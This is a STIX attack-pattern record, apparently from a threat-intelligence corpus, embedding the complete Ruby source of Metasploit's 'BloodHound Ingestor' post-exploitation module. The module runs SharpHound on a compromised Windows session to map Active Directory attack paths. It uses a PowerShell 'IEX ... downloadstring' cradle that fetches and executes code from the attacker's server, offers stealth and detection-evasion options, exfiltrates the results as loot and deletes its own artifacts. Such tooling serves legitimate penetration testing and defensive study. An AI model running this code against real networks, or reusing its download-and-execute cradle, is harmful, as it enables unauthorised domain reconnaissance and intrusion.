{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--423dda96-093e-4fa4-bb47-1f89b77cd006",
    "created": "2024-08-14T16:33:05.059097Z",
    "modified": "2024-08-14T16:33:05.059101Z",
    "name": "BloodHound Ingestor",
    "description": " This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more. With this information BloodHound will easily identify highly complex attack paths that would otherwise be impossible to quickly identify within an Active Directory environment.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/bloodhound.rb",
            "external_id": "bloodhound.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/BloodHoundAD/BloodHound/"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'BloodHound Ingestor',\n        'Description' => %q{\n          This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more.\n          With this information BloodHound will easily identify highly complex attack paths that would otherwise be impossible to quickly\n          identify within an Active Directory environment.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h4ng3r <h4ng3r@computerpirate.me>',\n          'h00die'\n        ],\n        'References' => [ 'URL', 'https://github.com/BloodHoundAD/BloodHound/' ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'AKA' => ['sharphound'],\n          'SideEffects' => [ARTIFACTS_ON_DISK],\n          'Stability' => [],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      OptEnum.new('CollectionMethod', [\n        true, 'The collection method to use.', 'Default',\n        ['Group', 'LocalGroup', 'LocalAdmin', 'RDP', 'DCOM', 'PSRemote', 'Session', 'Trusts', 'ACL', 'Container', 'ComputerOnly', 'GPOLocalGroup', 'LoggedOn', 'ObjectProps', 'SPNTargets', 'Default', 'DCOnly', 'All']\n      ]),\n      OptString.new('Domain', [false, 'Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies']),\n      OptBool.new('Stealth', [true, 'Use stealth collection options, will sacrifice data quality in favor of much reduced network impact', false]),\n      OptBool.new('ExcludeDomainControllers', [true, 'Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior', false]),\n      OptString.new('DomainController', [false, 'Specify which Domain Controller to request data from. Defaults to closest DC using Site Names']),\n      OptInt.new('LdapPort', [false, 'Override the port used to connect to LDAP']),\n      OptBool.new('SecureLdap', [false, 'Uses LDAPs instead of unencrypted LDAP on port 636']),\n      # these were never implemented\n      # OptString.new('LDAPUsername', [false, 'User to connect to LDAP with', 'Default']),\n      # OptString.new('LDAPPassword', [false, 'Password for user you are connecting to LDAP with']),\n      # OptString.new('DisableKerbSigning', [false, 'Disables Kerberos Signing on requests', false]),\n      OptPath.new('OutputDirectory', [false, 'Folder to write json output to.  Default is Windows temp']),\n      OptEnum.new('Method', [true, 'Method to run Sharphound with', 'download', ['download', 'disk']]),\n      OptBool.new('EncryptZip', [false, 'If the zip should be password protected', true]),\n      OptBool.new('NoSaveCache', [false, 'Dont save the cache file to disk', true]),\n      OptString.new('ZipFileName', [false, 'Zip Output File Name.  Blank for random', '']),\n    ])\n  end\n\n  # Options removed or changed in sharphound v2 to sharphound v3\n  # Removed:\n  #   SearchForest\n  #   OU\n  #   IgnoreLdapCert\n  #   Threads\n  #   PingTimeout\n  #   SkipPing\n  #   LoopDelay\n  #   MaxLoopTime\n  #   SkipGCDeconfliction\n  # Renamed:\n  #   ExcludeDc -> ExcludeDomainControllers\n  #   LDAPUser -> LDAPUsername\n  #   LDAPPass -> LDAPPassword\n  #   JSONFolder -> OutputDirectory\n\n  # Options removed or changed in sharphound Renamed in v4 (1.0.4) from v3:\n  # Renamed\n  #   (many of the single dash verbose command names are now double dash as is usual in Linux land)\n  #   encryptzip -> zippassword\n  #   nosavecache -> memcache\n  #   ExcludeDomainControllers -> excludedcs\n\n  def sharphound_ps1\n    File.join(Msf::Config.data_directory, 'post', 'powershell', 'SharpHound.ps1')\n  end\n\n  def sharphound_exe\n    File.join(Msf::Config.data_directory, 'post', 'SharpHound.exe')\n  end\n\n  def on_request_uri(cli, _request)\n    base_script = File.read(sharphound_ps1)\n    send_response(cli, base_script)\n  end\n\n  def download_run\n    start_service\n    uri = get_uri\n    \"IEX (new-object net.webclient).downloadstring('#{uri}')\"\n  end\n\n  def disk_run\n    name = \"#{pwd}\\\\#{Rex::Text.rand_text_alpha_lower(4..10)}.exe\"\n    vprint_status \"Uploading sharphound.exe as #{name}\"\n    upload_file(name, sharphound_exe)\n    return \". #{name}\"\n  end\n\n  def run\n    if !have_powershell?\n      fail_with(Failure::Unknown, 'PowerShell is not installed')\n    end\n\n    extra_params = []\n    [\n      [datastore['Domain'], \"-d #{datastore['Domain']}\"],\n      [datastore['Stealth'], '--Stealth'],\n      # [datastore['SkipGCDeconfliction'], \"-SkipGCDeconfliction\"],\n      [datastore['ExcludeDomainControllers'], '--ExcludeDCs'],\n      [datastore['DomainController'], \"--DomainController #{datastore['DomainController']}\"],\n      [datastore['LdapPort'], \"--LdapPort #{datastore['LdapPort']}\"],\n      [datastore['SecureLdap'], '--SecureLdap'],\n      [datastore['NoSaveCache'], '--MemCache'],\n    ].each do |params|\n      if params[0]\n        extra_params << params[1]\n      end\n    end\n\n    extra_params = \"#{extra_params.join(' ')} \"\n\n    if datastore['EncryptZip']\n      # for consistency, we use lower case password here since exe requires all extra_params to be lowercase\n      zip_pass = Rex::Text.rand_text_alpha_lower(12..20)\n      extra_params += \"--ZipPassword #{zip_pass} \"\n    end\n\n    # these options are only added if they aren't the sharphound default\n    unless datastore['CollectionMethod'] == 'Default'\n      extra_params += \"-c #{datastore['CollectionMethod']}\"\n    end\n    tmp_path = datastore['OutputDirectory'] || get_env('TEMP')\n\n    zip_name = datastore['ZipFileName'].empty? ? Rex::Text.rand_text_alpha_lower(4..10) : datastore['ZipFileName']\n\n    if datastore['Method'] == 'download'\n      command = download_run\n      extra_params = extra_params.gsub('--', '-')\n      invoker = \"Invoke-BloodHound -OutputDirectory \\\"#{tmp_path}\\\" -ZipFileName #{zip_name} #{extra_params}\"\n    elsif datastore['Method'] == 'disk'\n      command = disk_run\n      exe = command.sub('. ', '') # so we get the filename again\n      # for exe, we move invoker into command to run more friendly\n      invoker = ''\n      extra_params = extra_params.downcase\n      command = \"#{command} --outputdirectory \\\"#{tmp_path}\\\" --zipfilename #{zip_name} #{extra_params}\"\n    end\n\n    print_status(\"Loading BloodHound with: #{command}\")\n    print_status(\"Invoking BloodHound with: #{invoker}\") unless invoker.empty?\n    process, _pid, _c = execute_script(\"#{command}; #{invoker}\")\n\n    while (line = process.channel.read)\n      line.split(\"\\n\").map { |s| print_status(s) }\n      m = line.match(/Enumeration Completed/)\n      sleep 30 # a final wait just in case we caught the text prior to the zip happening\n      next unless m\n\n      # we now need to find our zip, its a datetime_zipfilename.zip naming convention\n      zip_path = nil\n      files = ls(tmp_path)\n      files.each do |file|\n        next unless file.end_with?(\"#{zip_name}.zip\")\n\n        zip_path = \"#{tmp_path}\\\\#{file}\"\n        break\n      end\n      if zip_path.nil?\n        print_bad(\"Unable to find results file in #{tmp_path}.\")\n      end\n\n      p = store_loot('windows.ad.bloodhound', 'application/zip', session, read_file(zip_path), File.basename(zip_path))\n      rm_f zip_path\n      print_good(\"Downloaded #{zip_path}: #{p}\")\n      rm_f(zip_path)\n      # store the password since we know it was successful\n      if datastore['EncryptZip']\n        print_good \"Zip password: #{zip_pass}\"\n        report_note(host: session,\n                    data: \"Bloodhound/Sharphound loot #{p} password is #{zip_pass}\",\n                    type: 'Sharphound Zip Password')\n      end\n      break\n    end\n\n    if datastore['Method'] == 'disk'\n      vprint_status \"Deleting #{exe}\"\n      rm_f exe\n    end\n  end\n\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}